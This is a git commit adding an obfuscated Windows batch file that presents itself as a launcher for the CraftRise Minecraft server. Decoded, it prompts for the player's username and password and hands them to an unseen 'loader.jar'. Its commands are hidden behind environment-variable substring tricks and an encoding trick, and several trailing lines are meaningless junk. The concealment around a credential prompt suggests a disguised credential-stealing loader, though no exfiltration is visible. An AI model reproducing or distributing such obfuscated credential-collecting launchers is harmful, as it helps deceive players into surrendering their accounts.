c693f4c55da0906aa3af1ffe917134d4bfabd7c4
Talha Demir <104279021+TalhaDevv@users.noreply.github.com>
2023-08-23 02:23:15 +0300

    Add files via upload

---
+++ baslat.bat
@@ -0,0 +1,20 @@
+ÿþ&cls
+@%pUBlIc:~89,83%%PUBLic:~5,1%CHo^ of^%PuBlIC:~46,16%f
+SEt R^=Jg^%pUBLIc:~13,1%^gtGXz%pUBLIc:~4,1%w%pUBLIc:~11,1%^hm%pUBLIc:~10,1%^S^HI^O^A
+^%pUBlIC:~14,1%^L%pUBliC:~55,17%^%publIc:~4,1%
+@^e^c%r:~15,1%^%r:~17,1% ^%r:~17,1%n
+@ec%r:~11,1%o off
+c%r:~11,1%cp 65001 > n%r:~13,1%l
+cd /d "%~dp0"
+color 9
+cl%r:~8,1%
+%r:~8,1%e%r:~4,1% /p "%r:~13,1%%r:~8,1%erNa%r:~12,1%e=Craf%r:~4,1%R%r:~2,1%%r:~8,1%e %r:~15,1%e%r:~8,1%ap %r:~16,1%%r:~8,1%%r:~12,1%%r:~2,1%n: "
+%r:~8,1%e%r:~4,1% /p "pa%r:~8,1%%r:~8,1%Word=Craf%r:~4,1%R%r:~2,1%%r:~8,1%e %r:~15,1%e%r:~8,1%ap %r:~14,1%%r:~2,1%fren: "
+%r:~8,1%e%r:~4,1% /p "ra%r:~12,1%=R%r:~18,1%M (%r:~5,1%B C%r:~2,1%n%r:~8,1%%r:~2,1%nden %r:~17,1%rnek 4): "
+"%~dp0%r:~10,1%%r:~2,1%n/java" -%r:~6,1%%r:~12,1%x%ram%%r:~5,1% -%r:~6,1%%r:~6,1%:+U%r:~8,1%e%r:~5,1%1%r:~5,1%C -%r:~6,1%%r:~6,1%:+UnlockExper%r:~2,1%%r:~12,1%en%r:~4,1%alVM%r:~17,1%p%r:~4,1%%r:~2,1%on%r:~8,1% -%r:~6,1%%r:~6,1%:%r:~5,1%1Ne%r:~9,1%%r:~14,1%%r:~2,1%%r:~7,1%ePercen%r:~4,1%=20 -%r:~6,1%%r:~6,1%:%r:~5,1%1Re%r:~8,1%ervePercen%r:~4,1%=20 -%r:~6,1%%r:~6,1%:Max%r:~5,1%CPa%r:~13,1%%r:~8,1%eM%r:~2,1%ll%r:~2,1%%r:~8,1%=50 -%r:~6,1%%r:~6,1%:%r:~5,1%1%r:~15,1%eapRe%r:~1,1%%r:~2,1%on%r:~14,1%%r:~2,1%%r:~7,1%e=32M -nover%r:~2,1%fy -Djava.l%r:~2,1%%r:~10,1%rary.pa%r:~4,1%%r:~11,1%="%~dp0\na%r:~4,1%%r:~2,1%ve%r:~8,1%" -jar loader.jar --%r:~13,1%%r:~8,1%erna%r:~12,1%e %userName% --pa%r:~8,1%%r:~8,1%%r:~9,1%ord %passWord%
+pa%r:~13,1%%r:~8,1%e
+@ec%r:~11,1%o off
+%r:~8,1%e%r:~4,1% a = %%~i
+%r:~8,1%e%r:~4,1% a = % + %~i"%%~%r:~2,1%"%
+set a = %a%
+:aaaaaaaaaaaaaaaaaaaaaaaaaaaaab
